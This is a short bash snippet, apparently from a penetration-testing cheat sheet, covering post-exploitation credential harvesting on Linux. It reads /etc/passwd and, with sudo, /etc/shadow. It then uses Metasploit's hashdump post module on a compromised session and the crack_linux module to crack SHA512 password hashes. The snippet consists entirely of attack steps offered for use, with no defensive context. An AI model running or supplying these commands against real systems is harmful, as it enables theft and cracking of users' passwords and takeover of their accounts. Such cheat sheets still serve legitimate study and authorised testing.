
```bash
cat /etc/passwd
sudo cat /etc/shadow

# METASPLOIT (once exploited)
use post/linux/gather/hashdump
set SESSION <NUMBER>

use auxiliary/analyze/crack_linux
set SHA512 true
```
